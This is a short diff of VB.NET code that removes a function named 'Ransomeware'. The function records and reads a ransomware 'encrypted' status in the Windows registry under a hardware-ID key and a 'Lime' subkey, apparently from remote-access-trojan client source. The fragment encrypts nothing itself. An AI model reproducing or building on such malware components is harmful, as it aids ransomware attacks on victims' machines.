@@ -110,21 +110,6 @@ Public Class ID
         End Try
     End Function
 
-    Public Shared Function Ransomeware()
-        Try
-            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", Nothing)
-            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", Nothing) Is Nothing Then
-                My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
-                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Not encrypted")
-                Return "Not encrypted"
-            Else
-                Return readValue
-            End If
-        Catch ex As Exception
-            Return "Error"
-        End Try
-    End Function
-
     Public Shared Function ListDrivers()
         Try
             Dim sb As Text.StringBuilder = New Text.StringBuilder()
